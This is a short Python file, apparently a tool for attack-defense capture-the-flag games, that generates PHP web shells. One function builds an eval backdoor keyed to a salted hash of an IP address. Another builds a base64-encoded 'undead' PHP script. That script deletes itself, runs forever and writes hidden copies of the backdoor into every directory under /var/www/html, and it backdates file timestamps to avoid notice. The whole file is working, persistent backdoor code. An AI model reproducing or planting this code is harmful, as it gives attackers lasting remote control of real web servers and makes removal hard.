from base64 import b64encode
from util import salt,md5

def generate_webshell(ip):
	shell=f'''<?php eval($_POST['{md5(md5(ip+salt))}']);?>'''
	return shell



def generate_undead_shell(ip):
	shell='''<?php
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);

function recursion_write_dir($dir){
	$shell_content=base64_decode('%s');
	for($i=0;$i<100;$i++){
		$filename=$dir."/.".md5("shell%s_$i").".php";
		if(!file_exists($filename)){
			file_put_contents($filename, $shell_content);
		}
	}

	foreach(scandir($dir) as $key => $value){
		if(is_dir($dir.'/'.$value) && $value!='.' && $value !='..'){
			recursion_write_dir($dir.'/'.$value);
		}
	} 
}

while(1){
	recursion_write_dir('/var/www/html/');
	system('touch -m -d  "2017-11-12" .index.php');
	sleep(1);
}
?>
''' % (b64encode(generate_webshell(ip).encode()).decode(),ip)
	return b64encode(shell.encode()).decode()


# shell=generate_undead_shell('192.168.1.1')
# print(b64encode(("<?php eval($_POST['26e5fb891ec85bc766e209948ce12ccb']);?>").encode()).decode())